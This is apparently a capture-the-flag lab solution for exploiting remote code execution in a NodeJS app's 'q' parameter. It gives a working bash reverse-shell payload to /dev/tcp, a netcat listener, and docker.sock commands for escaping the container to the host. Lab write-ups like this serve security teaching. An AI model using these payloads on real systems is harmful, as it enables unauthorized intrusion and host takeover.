# Attacking insecure volume mounts - Solution

* The application is running at CTF VM. You can access it by navigating to `http://CTFVMIP`

![node app home page](images/insecure-mount-node-app.png)

* This NodeJS application is vulnerable to remote code execution (RCE) in `q` GET parameter. Access the endpoint using `http://CTFVMIP/?q="docker"`

![vulnerable parameter](images/insecure-mount-vulnerable-parameter.png)

* To exploit this RCE, we will be using below payload. Here `192.168.56.3` need to replace with your student VM IP

```bash
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.3/5555 0>%261"')
```

* Start the netcat listener on `student` machine to get the reverse shell

```bash
nc -lvp 5555
```

![nc listen in student vm](images/nc-student-listen.png)

* To exploit and get reverse shell use the below URL. It contains the payload to connect back to student vm. Ensure that you have replaced `192.168.56.3` with your student VM IP

```bash
http://CTFVMIP?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.3/5555 0>%261"')
```

![reverse shell exploit](images/insecure-mount-exploit.png)

* Now we will receive the reverse shell in our student vm where we listening via `nc` 

![reverse shell in nc](images/insecure-mont-reverse-shell.png)

* Now, we have shell inside the docker container, we can explore the container for post exploitation

* We can see that `ls -l /var/run/docker.sock` is available and mounted from the host system.

![docker socket](images/insecure-mount-docker-socket.png)

> **This allows attacker to access the host docker service using host option with docker client by using the UNIX socket**

* The docker client is already downloaded into the container and is at `/root/docker`

```bash
cd /root/docker/
ls -l
```

![docker client files](images/docker-client-file.png)

* To access the host resource using the `docker.sock` UNIX socket. Run the following

```bash
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
```

* Now, we have full privilege over the host system :)


## Fixing this vulnerability

* Running the containers with limited user privileges and using rootless containers
* Also using isolated instances for the required privileges
